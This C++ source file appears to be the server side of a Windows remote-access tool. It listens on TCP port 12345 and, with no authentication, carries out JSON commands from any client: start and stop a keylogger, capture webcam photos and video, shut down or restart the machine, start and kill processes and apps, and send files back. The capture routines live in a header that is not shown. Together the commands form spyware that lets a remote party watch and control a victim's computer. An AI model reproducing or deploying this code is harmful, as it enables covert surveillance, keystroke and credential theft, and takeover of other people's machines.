//cmake -S . -B build -G "MinGW Makefiles" ^ -DOpenCV_DIR="C:/msys64/mingw64/lib/cmake/opencv4"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <string>
#include "json.hpp"
#include "../lib/service.h"

#pragma comment(lib, "Ws2_32.lib")
#define PORT 12345

using json = nlohmann::json;
using namespace std;

void sendResponse(SOCKET clientSocket, const string& msg) {
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

void handle_client(SOCKET clientSocket) {
    char buffer[4096];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        string data(buffer);

        cout << "Received from client: " << data << endl;

        try {
            json request = json::parse(data);
            string command = request["command"];
            string value;

            if (command == "download_file") {
                value = request.value("path", "");
            } else {
                value = request.value("value", "");
            }

            cout << "Command: " << command << ", Value: " << value << endl;

            if (command == "start_keylogger") {
                start_keylogger();
                sendResponse(clientSocket, "Keylogging started.\n");
            } else if (command == "stop_keylogger") {
                sendResponse(clientSocket, stop_keylogger() + "\n");
            } else if (command == "capture_photo") {
                capture_photo(clientSocket);
                //sendResponse(clientSocket, capture_photo() + "\n");
            } else if (command == "record_video") {
                int duration = value.empty() ? 5 : stoi(value);
                //sendResponse(clientSocket, record_video(duration) + "\n");
                record_video(clientSocket,duration);
            } else if (command == "shutdown") {
                sendResponse(clientSocket, shutdown_system() + "\n");
            } else if (command == "restart") {
                sendResponse(clientSocket, restart_system() + "\n");
            } else if (command == "list_apps") {
                sendResponse(clientSocket, list_apps() + "\n");
            } else if (command == "start_app") {
                sendResponse(clientSocket, start_app(value) + "\n");
            } else if (command == "stop_app") {
                sendResponse(clientSocket, stop_app(value) + "\n");
            } else if (command == "list_process") {
                //sendResponse(clientSocket, list_processes());
            } else if (command == "start_process") {
                sendResponse(clientSocket, start_process(value) + "\n");
            } else if (command == "stop_process") {
                sendResponse(clientSocket, stop_process(value) + "\n");
            } else if (command == "download_file") {
                download_file(clientSocket, value);
                sendResponse(clientSocket, "\nDownload success\n");
            } else {
                sendResponse(clientSocket, "Unknown command: " + command + "\n");
            }

        } catch (json::parse_error& e) {
            sendResponse(clientSocket, "__ERROR__Invalid JSON format.\n");
        } catch (exception& e) {
            sendResponse(clientSocket, string("Error executing command: ") + e.what() + "\n");
        }
    }

    closesocket(clientSocket);
    cout << "Client disconnected.\n";
}

int main() {
    //cout << "vo server" << endl;
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr{};

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);

    cout << "Server listening on port " << PORT << "...\n";

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);
        if (clientSocket == INVALID_SOCKET) {
            cerr << "Accept failed. Error code: " << WSAGetLastError() << endl;
            continue;
        }
        cout << "Accepted connection.\n";
        thread clientThread(handle_client, clientSocket);
        clientThread.detach();
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}